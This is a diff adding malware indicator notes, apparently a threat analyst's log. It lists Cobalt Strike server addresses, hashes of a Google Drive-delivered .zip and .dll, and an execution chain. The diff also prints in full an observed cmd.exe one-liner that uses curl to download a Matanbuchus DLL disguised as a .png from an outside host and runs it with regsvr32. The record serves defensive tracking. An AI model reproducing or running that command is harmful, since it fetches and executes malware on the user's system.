@@ -62,3 +62,26 @@ Cobalt Strike:
 185.217.1[.]23 port 443 - hxxps://extic[.]icu/[unknown]
 190.123.44[.]220 port 443 - hxxps://reykh[.]icu/load/hunt.jpgv
 190.123.44[.]220 port 443 - hxxps://reykh[.]icu/thaw.txt
+
+******************************
+
+Google drive delivery >>
+
+.zip d821e3b822804d9733d00d04955fb89a8e83d231a1619e292702efcfeae8355b - (E98346)
+.dll 4f5383be8c6a3d52baaf771ba3d8405cb18e86edc1f8adcac6a3c24130cf7362 - 
+
+******************************
+
+Exec >> .zip .lnk > .dll
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\Items\Items745.lnk
+
+cmd.exe" /q /c echo 'nY' && MD "C:\Users\Admin\AppData\Roaming\hP" && ping Mh4m.com && curl.exe --output C:\Users\Admin\AppData\Roaming\hP\uVbU.UEMX.pafB https://re9cred.com/N9tIgZB/Wq.png && echo "cM" && ping 4umz.com && regsvr32 -n -i C:\Users\Admin\AppData\Roaming\hP\uVbU.UEMX.pafB
+
+ping  Mh4m.com 
+
+*************************************************
+
+https://re9cred.com/N9tIgZB/Wq.png (Matanbuchus .dll)
+
+*************************************************
